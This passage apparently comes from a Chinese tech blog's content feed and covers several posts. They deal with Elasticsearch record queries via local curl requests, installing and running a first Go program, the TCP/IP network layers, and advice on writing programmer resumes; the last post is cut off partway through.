class="code"><pre><span class="line">&quot;_version&quot; : 2,</span><br><span class="line">&quot;result&quot; : &quot;updated&quot;,</span><br><span class="line">&quot;created&quot; : false</span><br></pre></td></tr></table></figure><p>可以看到，记录的 Id 没变，但是版本（version）从1变成2，操作类型（result）从created变成updated，created字段变成false，因为这次不是新建记录。</p><h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><p>删除记录就是发出 DELETE 请求。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X DELETE <span class="string">'localhost:9200/customer/_doc/1'</span></span><br></pre></td></tr></table></figure><h2 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h2><h3 id="返回所有记录"><a href="#返回所有记录" class="headerlink" title="返回所有记录"></a>返回所有记录</h3><p>最新版本的 ES，通过请求<code>/Index/_search</code>，就会返回对应索引下的所有记录。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"localhost:9200/customer/_search?pretty"</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"took"</span> : <span class="number">2</span>,</span><br><span class="line">  <span class="string">"timed_out"</span> : <span class="keyword">false</span>,</span><br><span class="line">  <span class="string">"_shards"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"successful"</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="string">"skipped"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="string">"failed"</span> : <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"hits"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : &#123;</span><br><span class="line">      <span class="string">"value"</span> : <span class="number">2</span>,</span><br><span class="line">      <span class="string">"relation"</span> : <span class="string">"eq"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"max_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">    <span class="string">"hits"</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">        <span class="string">"_id"</span> : <span class="string">"-c3r_oMBDokqbW4aIGss"</span>,</span><br><span class="line">        <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">        <span class="string">"_source"</span> : &#123;</span><br><span class="line">          <span class="string">"name"</span> : <span class="string">"张三"</span>,</span><br><span class="line">          <span class="string">"gender"</span> : <span class="string">"男"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">        <span class="string">"_id"</span> : <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">"_score"</span> : <span class="number">1.0</span>,</span><br><span class="line">        <span class="string">"_source"</span> : &#123;</span><br><span class="line">          <span class="string">"name"</span> : <span class="string">"王五"</span>,</span><br><span class="line">          <span class="string">"gender"</span> : <span class="string">"女"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中，返回结果：</p><ul><li>took 字段表示该操作的耗时（单位为毫秒）</li><li>timed_out 字段表示是否超时</li><li>hits 字段表示命中的记录</li></ul><p>hits 的子字段的含义如下：</p><ul><li>total：返回记录数</li><li>max_score：最高的匹配程度</li><li>hits：返回的记录组成的数组</li></ul><p>返回的记录中，每条记录都有一个 <code>_score</code> 字段，表示匹配的程序，默认是按照这个字段降序排列。</p><h3 id="全文搜索"><a href="#全文搜索" class="headerlink" title="全文搜索"></a>全文搜索</h3><p>ES 的查询非常特别，使用自己的<a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.4/query-dsl.html" target="_blank" rel="noopener">查询语法</a>，要求 GET 请求带有数据体。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">"localhost:9200/_search?pretty"</span> -H <span class="string">'Content-Type: application/json'</span> -d<span class="string">'&#123;</span></span><br><span class="line"><span class="string">    "query":&#123;</span></span><br><span class="line"><span class="string">        "bool":&#123;</span></span><br><span class="line"><span class="string">            "must":[</span></span><br><span class="line"><span class="string">                &#123;</span></span><br><span class="line"><span class="string">                    "term":&#123;</span></span><br><span class="line"><span class="string">                        "name.keyword":"张三"</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            ],</span></span><br><span class="line"><span class="string">            "must_not":[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ],</span></span><br><span class="line"><span class="string">            "should":[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            ]</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    "from":0,</span></span><br><span class="line"><span class="string">    "size":10,</span></span><br><span class="line"><span class="string">    "sort":[</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    ],</span></span><br><span class="line"><span class="string">    "aggs":&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;'</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"took"</span> : 3,</span><br><span class="line">  <span class="string">"timed_out"</span> : <span class="literal">false</span>,</span><br><span class="line">  <span class="string">"_shards"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : 1,</span><br><span class="line">    <span class="string">"successful"</span> : 1,</span><br><span class="line">    <span class="string">"skipped"</span> : 0,</span><br><span class="line">    <span class="string">"failed"</span> : 0</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="string">"hits"</span> : &#123;</span><br><span class="line">    <span class="string">"total"</span> : &#123;</span><br><span class="line">      <span class="string">"value"</span> : 1,</span><br><span class="line">      <span class="string">"relation"</span> : <span class="string">"eq"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">"max_score"</span> : 0.6931471,</span><br><span class="line">    <span class="string">"hits"</span> : [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="string">"_index"</span> : <span class="string">"customer"</span>,</span><br><span class="line">        <span class="string">"_id"</span> : <span class="string">"-c3r_oMBDokqbW4aIGss"</span>,</span><br><span class="line">        <span class="string">"_score"</span> : 0.6931471,</span><br><span class="line">        <span class="string">"_source"</span> : &#123;</span><br><span class="line">          <span class="string">"name"</span> : <span class="string">"张三"</span>,</span><br><span class="line">          <span class="string">"gender"</span> : <span class="string">"男"</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.elastic.co/guide/en/welcome-to-elastic/current/getting-started-guides.html#getting-started-guides" target="_blank" rel="noopener">ElasticSearch Getting started guides</a></li><li><a href="https://www.elastic.co/guide/en/elasticsearch/reference/8.4/query-dsl.html" target="_blank" rel="noopener">ElasticSearch 查询语法</a></li><li><a href="https://www.ruanyifeng.com/blog/2017/08/elasticsearch.html" target="_blank" rel="noopener">全文搜索引擎 Elasticsearch 入门教程</a></li><li><a href="https://blog.csdn.net/qq_33999844/article/details/108907902" target="_blank" rel="noopener">ES 的 unassigned shards 核心处理方案</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> ElasticSearch </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ElasticSearch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go 语言学习笔记——运行第一个 Go 程序</title>
      <link href="/go-language-learning-manual%E2%80%94%E2%80%94transportation-first-go-procedure/"/>
      <url>/go-language-learning-manual%E2%80%94%E2%80%94transportation-first-go-procedure/</url>
      
        <content type="html"><![CDATA[<p>时隔一年之久，再一次来学习 Go。</p><a id="more"></a><h2 id="设计哲学"><a href="#设计哲学" class="headerlink" title="设计哲学"></a>设计哲学</h2><p>Go 语言的设计哲学：<strong>简单、显式、组合、并发和面向工程</strong>：</p><ul><li>简单是指 Go 语言特性始终保持在少且足够的水平，不走语言特性融合的道路，但又不乏生产力。简单是 Go 生产力的源泉，也是 Go 对开发者的最大吸引力</li><li>显式是指任何代码行为都需开发者明确知晓，不存在因“暗箱操作”而导致可维护性降低和不安全的结果</li><li>组合是构建 Go 程序骨架的主要方式，它可以大幅降低程序元素间的耦合，提供程序的可扩展性和灵活性</li><li>并发是 Go 敏锐地把握了 CPU 向多核方向发展这一趋势的结果，可以让开发人员在多核时代更容易写出充分利用系统资源、支持性能随 CPU 核数增加而自然提升的应用程序</li><li>面向工程是 Go 语言在语言设计上的一个重大创新，它将语言要解决的问题域扩展到那些原本并不是由编程语言去解决的领域，从而覆盖了更多开发者在开发过程遇到的“痛点”，为开发者提供了更好的使用体验</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>Go 从 2009 年开源并演化到今天，它的安装方法其实都已经很成熟了。</p><p>写下这篇笔记时，Go 的版本已经到了 1.18.1。</p><p>Windows 和 Mac 可以直接从官网<a href="https://golang.google.cn/dl/" target="_blank" rel="noopener">下载</a> 最新的安装包，在图形界面的引导下，一路“下一步”，即可安装成功。</p><p>Linux 则通过命令行的方式进行安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ wget -c https://go.dev/dl/go1.19.2.linux-amd64.tar.gz \</span><br><span class="line">tar -C /usr/<span class="built_in">local</span> -xzf go1.19.2.linux-amd64.tar.gz</span><br></pre></td></tr></table></figure><p>解压成功，即可在 <code>/usr/local</code> 下面看到名为 go 的安装目录。</p><p>添加环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/<span class="built_in">local</span>/go/bin &amp;&amp; <span class="built_in">source</span> ~/.profile</span><br></pre></td></tr></table></figure><p>查看是否安装成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go version</span><br><span class="line"></span><br><span class="line">go version go1.19.2 darwin/amd64</span><br></pre></td></tr></table></figure><h2 id="配置-Go"><a href="#配置-Go" class="headerlink" title="配置 Go"></a>配置 Go</h2><p>其实 Go 在安装后是开箱即用的，无需做任何配置就能使用。</p><p>但是因为众所周知的原因，一般会修改 <code>GOPROXY</code> 环境变量：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ go env -w GOPROXY=https://goproxy.cn,direct</span><br><span class="line"></span><br><span class="line"><span class="comment"># 备用goproxy服务 https://mirrors.aliyun.com/goproxy/</span></span><br></pre></td></tr></table></figure><p>顺便看一下其他的一些常用配置项：</p><table><thead><tr><th>名称</th><th>作用</th><th>值</th></tr></thead><tbody><tr><td>GOARCH</td><td>用于指示编译器生成代码（针对平台 CPU 架构）</td><td>主要值是 AMD64、Arm 等，默认值是本机的 CPU 架构</td></tr><tr><td>GOOS</td><td>用于指示 Go 编译器生成代码（针对平台的操作系统</td><td>主要值是 Linux、Darwin、Windows 等，默认值是本机的操作系统</td></tr><tr><td>GO111MODULE</td><td>它的值决定了当前使用的构建模式是传统的 GOPATH 模式还是新引入的 Go Module 模式</td><td>在 Go1.16 版本 Go Module 构建模式默认开启，该变量的值是 on</td></tr><tr><td>GOCACHE</td><td>用于指示存储构建结果缓存的路径，这些缓存可能会被后续构建所使用</td><td>在不同的操作系统上，GOCACHE 有不同的默认值，通过 go env GOMODCACHE 查看</td></tr><tr><td>GOMODCACHE</td><td>用于指示存放 Go Module 的路径</td><td>在不同的操作系统上，GOCACHE 有不同的默认值，通过 go env GOMODCACHE 查看</td></tr><tr><td>GOPROXY</td><td>用来配置 Go Module proxy 服务</td><td>默认值是 <code>https://proxy.golang.org.direct</code></td></tr><tr><td>GOPATH</td><td>在传统的 GOPATH 构建模式下，用于指示 Go 包搜索路径的环境变量，在 Go module 机制启用之前是 Go 核心配置项，Go 1.8 版本之前需要手动配置，Go 1.8 版本之后引入了默认的GOPATH（$HOME/go）</td><td></td></tr><tr><td>GOROOT</td><td>指示 GO 安装路径，GO 1.10 版本引入了默认的 GOROOT，开发者无需显式设置，Go 程序会自动根据自己所在的路径推导出 GOROOT 的路径</td><td></td></tr></tbody></table><h2 id="hello-world"><a href="#hello-world" class="headerlink" title="hello world"></a>hello world</h2><p>首先，需要创建一个 <code>main.go</code> 的源文件。</p><p>这里需要注意一下 Go 的命名规则：Go 源文件总是用<strong>全小写字母形式的短小单词命名</strong>，并且 <code>.go</code> 扩展名结尾。</p><p>如果要在源文件的名字中使用多个单词，通常直接是将多个单词连接起来作为源文件名，而不是使用其他分割符。<br>比如下划线，通常会使用 <code>helloworld.go</code> 作为文件名，而不是 <code>hello_world.go</code>。</p><p>这是因为下划线这种分割符，在 Go 源文件命名中有特殊作用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.go</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">"fmt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  fmt.Println(<span class="string">"hello world"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>写完之后，就可以编译运行第一个 Go 程序了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ go build main.go   <span class="comment"># 编译</span></span><br><span class="line"></span><br><span class="line">$ ./main             <span class="comment"># 运行</span></span><br><span class="line">hello, world</span><br></pre></td></tr></table></figure><p>上面这个简单的 Go 程序，由三个很重要的部分组成：</p><ul><li><code>package main</code>：定义了 Go 中的一个包 package</li><li><code>import fmt</code>：声明导入标准库 fmt 目录下的包</li><li><code>func main(){}</code>：定义入口函数</li></ul><p>下面一一说明。</p><h3 id="package"><a href="#package" class="headerlink" title="package"></a>package</h3><p>包（package）是 Go 语言的基本组成单元，通常使用单个的小写单词命名，一个 Go 程序本质上就是一组包的集合。</p><p>所有 Go 代码都有属于自己的 package（很像 PHP 的命名空间的概念），在这里的“helloworld”示例的所有代码都在一个名为 main 的包中。main 包在 Go 中是一个特殊的包，<strong>整个 Go 程序中仅允许存在一个名为 main 的包</strong>。</p><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p><code>import</code> 的作用是导入标准库或者第三方包，在这里的作用是导入标准库 fmt 目录下的包。</p><p>在上面的示例中，有两处都使用了 <code>fmt</code> 这个字面值，但是其含义是不一样的。</p><ul><li><code>import fmt</code> 一行中“fmt”代表的是包的导入路径（Import），它表示的是<strong>标准库下的 fmt 目录</strong></li><li><code>fmt.Println</code> 函数调用一行中的“fmt”代表的则是<strong>包名</strong></li></ul><p>main 函数体中之所以可以调用 fmt 包的 Println 函数，还有最后一个原因，那就是 Println 函数名的首字母是大写的。</p><p>在 Go 语言中，<strong>只有首字母为大写的标识符才是导出的（Exported），才能对包外的代码可见</strong>；如果首字母是小写的，那么就说明这个标识符<strong>仅限于在声明它的包内可见</strong>。</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>main 包中的主要代码是一个名为 main 的函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">"hello, world"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的 main 函数会比较特殊：<strong>当运行一个可执行的 Go 程序的时，所有的代码都会从这个入口函数开始运行</strong>。</p><hr><p>Go 要求所有的函数体都要被花括号包裹起来，用来标记函数体。按照惯例，推荐把左花括号与函数声明置于同一行并以空格分隔。<br>Go 语言内置了一套 Go 社区约定俗称的代码风格，并随安装包提供了一个名为 Gofmt 的工具，这个工具可以帮助将代码自动格式化为约定的风格。</p><hr><p>通过观察输出，可以发现，传入的字符串就是执行程序后在终端的标准输出上看到的字符串。</p><p>这种“所见即所得”得益于 Go 源码文件本身采用的是 Unicode 字符集，而且用的是 UTF-8 标准的字符编码方式，这与编译后的程序所运行的环境所使用的字符集和字符编码方式是一致的。</p><hr><p>整个示例程序源码中，都没有使用过分号来标识语句的结束，这是因为，大多数分号都是可选的，常常被省略，不过在源码编译时，Go 编译器会自动插入这些被省略的分号。</p><p>所以加上分号也是完全合法的，只不过 gofmt 在按约定格式化代码时，会自动删除这些分号。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>通过 <code>hello world</code> 示例程序，了解了 Go 的基本源码结构，以下是重点：</p><ul><li>包是 Go 语言的基本组成单元。一个 Go 程序就是一组包的集合，所有 Go 代码都位于包中</li><li>Go 源码可以导入其他 Go 包，并使用其中的导出语法元素，包括类型、变量、函数、方法等</li><li>整个 Go 程序中仅允许存在一个名为 main 的包只能由一个 main 包; main 函数是整个 Go 应用的入口函数</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://time.geekbang.org/column/intro/100093501" target="_blank" rel="noopener">Tony Bai · Go 语言第一课</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Go </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络学习——01 TCP/IP网络模型</title>
      <link href="/computer-network-learning-01-tcp-ip-network-model/"/>
      <url>/computer-network-learning-01-tcp-ip-network-model/</url>
      
        <content type="html"><![CDATA[<p>为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了”开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。</p><a id="more"></a><p>它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：</p><ul><li>物理层（Physics Layer）</li><li>数据链路层（Data Link Layer）</li><li>网络层（Network Layer）</li><li>传输层（Transport Layer）</li><li>会话层（Session Layer）</li><li>表示层（Presentation Layer）</li><li>应用层（Application Layer）</li></ul><p>除了标准的OSI七层模型以外，常见的网络层次划分还有TCP/IP四层协议以及TCP/IP五层协议，它们之间的对应关系如下图所示：</p><p><img src="https://www.runoob.com/wp-content/uploads/2018/09/1538030296-7490-20150904094019903-1923900106.jpg" alt=""></p><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>应用层是网络模型中的最上层。</p><p>我们能直接接触到的就是应用层，电脑或手机使用的应用软件都是在应用层实现的。那么，当两个不同设备的应用需要通信的时候，应用就把应用数据传给下一层，也就是传输层。</p><p>应用层只需要关注为用户提供应用功能，不用去关心数据是如何传输的。</p><h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>应用层的数据包会传给传输层，传输层(Transport Layer)是为应用层提供网络支持的。</p><p>在传输层会有两个传输协议，分别是 TCP 和 UDP。</p><p>TCP 的全称叫传输层控制协议(Transmission Control Protocol)，大部分应用使用的正是 TCP 传输层协议，比 如 HTTP 应用层协议。TCP 相比 UDP 多了很多特性，比如流􏰁控制、超时􏰀传、拥塞控制等，这些都是为了保证 数据包能可靠地传输给对方。</p><p>UDP 就相对很简单，简单到只负责发送数据包，不保证数据包是否能抵达对方，但它实时性相对更好，传输效率 也高。当然，UDP 也可以实现可靠传输，把 TCP 的特性在应用层上实现就可以，不过要实现一个商用的可靠 UDP 传输协议，也不是一件简单的事情。</p><h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>实际场景中的网络环节是错综复杂的，中间有各种各样的线路和分叉路口，如果一个设备的数据要传输给另一个设备，就需要在各种各样的路径和节点进行选择，而传输层的设计理念是简单、高效、专注，如果传输层还负责这一块功能就有点违背设计原则了。</p><p>也就是说，我们不希望传输层协议处理太多的事情，只需要服务好应用即可，让其作为应用间数据传输的媒介，帮 助实现应用到应用的通信，而实际的传输功能就交给下一层，也就是网络层(Internet Layer)。</p><p>网络层最常使用的是 IP 协议(Internet Protocol)，IP 协议会将传输层的报文作为数据部分，再加上 IP 包头组装 成 IP 报文，如果 IP 报文大小超过 MTU(以太网中一般为 1500 字节)就会再次进行分片，得到一个即将发送到网 络的 IP 报文。</p><p>网络层负责将数据从一个设备传输到另一个设备，世界上那么多设备，又该如何找到对方呢?因此，网络层需要有区分设备的编号。</p><p>我们一般用 IP 地址给设备进行编号，对于 IPv4 协议， IP 地址共 32 位，分成了四段，每段是 8 位。只有一个单纯 的 IP 地址虽然做到了区分设备，但是寻址起来就特别麻烦，全世界那么多台设备，难道一个一个去匹配?这显然 不科学。</p><p>因此，需要将 IP 地址分成两种意义：</p><ul><li>一个是网络号，负责标识该 IP 地址是属于哪个子网的;</li><li>一个是主机号，负责标识同一子网下的不同主机;</li></ul><p>怎么分的呢?这需要配合子网掩码才能算出 IP 地址 的网络号和主机号。那么在寻址的过程中，先匹配到相同的网络号，才会去找对应的主机。</p><p>除了寻址能力， IP 协议还有另一个􏰀要的能力就是路由。实际场景中，两台设备并不是用一条网线连接起来的， 而是通过很多网关、路由器、交换机等众多网络设备连接起来的，那么就会形成很多条网络的路径，因此当数据包 到达一个网络节点，就需要通过算法决定下一步走哪条路径。</p><p>所以，IP 协议的寻址作用是告诉我们去往下一个目的地该朝哪个方向走，路由则是根据「下一个目的地」选择路 径。寻址更像在导航，路由更像在操作方向盘。</p><h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>实际场景中，网络并不是一个整体，比如你家和我家就不属于一个网络，所以数据不仅可以在同一个网络中设备间进行传输，也可以跨网络进行传输。</p><p>一旦数据需要跨网络传输，就需要有一个设备同时在两个网络当中，这个设备一般是路由器，路由器可以通过路由 表计算出下一个要去的 IP 地址。</p><p>那问题来了，路由器怎么知道这个 IP 地址是哪个设备的呢?</p><p>于是，就需要有一个专⻔的层来标识网络中的设备，让数据在一个链路中传输，这就是数据链路层(Data Link Layer)，它主要为网络层提供链路级别传输的服务。</p><p>每一台设备的网卡都会有一个 MAC 地址，它就是用来唯一标识设备的。路由器计算出了下一个目的地 IP 地址，再 通过 ARP 协议找到该目的地的 MAC 地址，这样就知道这个 IP 地址是哪个设备的了。</p><blockquote><p>网络层与数据链路层有什么关系呢？</p></blockquote><p>Mac 的作用是实现『直连』的两个设备之间的通信，而 IP 则负责在『没有直连』的两个网络之间进行通信传输。</p><h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>当数据准备要从设备发送到网络时，需要把数据包转换成电信号，让其可以在物理介质中传输，这一层就是物理层 (Physical Layer)，它主要是为数据链路层提供二进制传输的服务。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>网络协议通常是从上到下，分成五层，分别是应用层、传输层、网络层、数据链路层、物理层。</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20221009125851.png" alt=""></p><ul><li>应用层：<strong>为应用程序提供服务</strong>，并规定应用程序中通信相关的细节。包括（文件传输FTP、电子邮件SMTP、远程登录SSH）等协议</li><li>传输层：<strong>起着可靠传输的作用</strong>。只在通信双方节点上进行处理，而无需在路由器上处理。</li><li>网络层：将数据传输到目标地址，目标地址可以是多个网络通过路由器连接而成的某一个地址。因此这一层<strong>主要负责寻址和路由选择</strong>。</li><li>数据链路层：负责物理层面上的互联的、节点之间的通信传输。</li><li>物理层：把数据包转换成电信号，让其可以在物理介质中传输。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xiaolincoding.com/network/" target="_blank" rel="noopener">图解网络——小林coding</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>程序员如何写好简历</title>
      <link href="/how-to-write-a-good-resume-for-programmers/"/>
      <url>/how-to-write-a-good-resume-for-programmers/</url>
      
        <content type="html"><![CDATA[<p>简历就是一块敲门砖，就算技术很好，但是简历写得不好的话，也是得不到认可的，获取不到面试机会的。</p><a id="more"></a><blockquote><p>那么什么样的简历算写得不好呢？</p></blockquote><p>命中下面的多条</p><ul><li>简历样式不统一，尽量少在简历中使用表格</li><li>文字样式不要花里胡哨</li><li>简历中一定要展示技术栈（技能清单），但是不要是单词本</li><li>个人评价（个人总结）不要写一些虚的东西，比如为人性格、诚实谦虚、勤奋、能吃苦耐劳、有耐心这类看不出优点特长的句子</li><li>不管工作多久，简历上的项目只需要三四个，不需要无意义进行堆砌</li><li>项目介绍篇幅不要过长，注意排版</li><li>有错别字</li></ul><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>简历一定写上自己的基本信息。</p><p>一般基本信息包括姓名、电话、电子邮箱、贯籍、求职意向、工作年限、年龄、在职状态、学历等这几部分。</p><h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><p>技术栈不能是单词本，要凸显技术细节，把你现在会的、已经掌握的，尽可能多地陈述给面试官。</p><p>错误的打开方式：<br><img src="inkdrop://file:WnWdheVfF" alt="clipboard.png"></p><p>正确的打开方式：</p><p><img src="inkdrop://file:PvVu8WFpD" alt="clipboard.png"></p><h2 id="个人评价"><a href="#个人评价" class="headerlink" title="个人评价"></a>个人评价</h2><p>个人评价这一块很重要，但是往往很多人的写法都是有问题的，完全看不出个性特点，写和没写没什么区别。</p><p>错误的打开方式：</p><ul><li>为人性格，诚实谦虚，勤奋，能吃苦耐劳，有耐心，有团队意识，能和同事和谐相处，能虚心接受别人的建议的人</li><li>责任心强，善于沟通，具有良好的团队合作精神；专业扎实，具有较强的钻研精神和学习能力；性格比较乐观外向</li></ul><p>正确的打开方式：</p><ul><li>三年开发经验，拥有一线互联网项目架构设计与研发经验，参与过百万级用户，日活万级社交系统开发</li><li>五年开发经验，其中三年以上大型系统架构设计经验，以及三年以上的团队管理经验，具有分布式、高并发、高可用、大数据量的系统架构设计以及研发经验</li></ul><h2 id="项目经验"><a href="#项目经验" class="headerlink" title="项目经验"></a>项目经验</h2><p>不管工作多久，简历上的项目只需要三四个，不需要凑字数，比如一些老项目，没有亮点的项目，就不要写上去。</p><ul><li>项目介绍篇幅不要过长，注意文字排版</li><li>项目有什么作用，有什么亮点，主要解决什么问题（尽量突出项目经验、技术背景、技术优势、行业深度）</li><li>凸显出来你在当前项目里面到底做什么事情，在项目中的核心作用，价值在什么地方</li></ul><p>错误的打开方式：</p><p><img src="inkdrop://file:LfDRuWzG9" alt="clipboard.png"></p><p>正确的打开方式：</p><p><img src="inkdrop://file:M9DB7nsxr" 